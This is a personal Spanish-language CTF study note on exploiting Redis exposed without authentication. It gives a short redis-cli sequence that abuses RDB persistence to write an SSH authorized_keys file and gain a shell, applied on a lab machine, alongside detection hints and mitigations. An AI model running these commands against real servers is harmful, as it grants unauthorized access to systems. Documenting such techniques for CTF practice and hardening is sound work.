---
tags: [tecnica, servicios, redis]
tipo: tecnica
categoria: servicios
estado: practicado
maquinas: [El Baifo]
---

# Redis sin autenticación

## 1. Qué es

Redis expuesto sin contraseña (`AUTH`), que permite leer/escribir claves y, abusando de la **persistencia RDB**, escribir ficheros arbitrarios.

## 2. Cómo funciona

- `CONFIG SET dir` + `CONFIG SET dbfilename` cambian la ruta del dump RDB.
- `SET` + `SAVE` escriben el contenido (p.ej. una `authorized_keys`) en esa ruta.

## 3. Cuándo sospecharla

- Puerto `6379` abierto; `redis-cli` no pide `AUTH`.

## 4. Cómo comprobarla (laboratorio autorizado)

```bash
redis-cli -h <host>
# INFO server ; CONFIG GET dir ; CONFIG GET dbfilename
# (guardar valores originales ANTES de tocar nada)
CONFIG SET dir /home/<user>/.ssh
CONFIG SET dbfilename authorized_keys
SET x "\n\n<contenido de authorized_keys>\n\n"
SAVE
```

## 5. Herramientas

- `redis-cli`, `ssh-keygen`.

## 6. Ejemplos en mis CTF

| Máquina | Contexto | Resultado |
|---|---|---|
| [[El Baifo]] | Redis sin auth → escritura de `authorized_keys` | SSH como `pastor01` |

## 7. Falsos positivos / pruebas fallidas

- No siempre Redis corre como un usuario con `~/.ssh` útil; comprobar el usuario del proceso.

## 8. Prevención y mitigación

- `requirepass`, `bind 127.0.0.1`, `rename-command CONFIG ""`, firewall.

## 9. Técnicas relacionadas

- [[SSH-Keys]], [[MQTT]]
